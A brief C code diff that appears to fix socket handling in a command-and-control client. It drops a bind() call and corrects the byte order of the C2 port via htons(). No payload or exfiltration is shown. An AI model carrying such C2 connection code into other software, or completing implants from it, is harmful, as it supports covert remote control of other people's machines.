@@ -62,7 +62,6 @@ BOOL NetworkInit(PCWSTR host, PCWSTR port, SOCKET* sock)
 		return FALSE;
 	}
 
-	status = bind(*sock, result->ai_addr, (INT)result->ai_addrlen);
 	FreeAddrInfoW(result);
 
 	if (status == SOCKET_ERROR)
@@ -99,7 +98,7 @@ struct sockaddr_in GetSockAddr()
 {
 	struct sockaddr_in sa = { 0 };
 	sa.sin_family = AF_INET;
-	sa.sin_port = (USHORT)wcstoul(DEFAULT_C2_PORT, L'\0', 10);
+	sa.sin_port = htons((USHORT)wcstoul(DEFAULT_C2_PORT, L'\0', 10));
 	InetPtonW(AF_INET, DEFAULT_C2_HOST, &(sa.sin_addr.S_un.S_addr));
 
 	return sa;
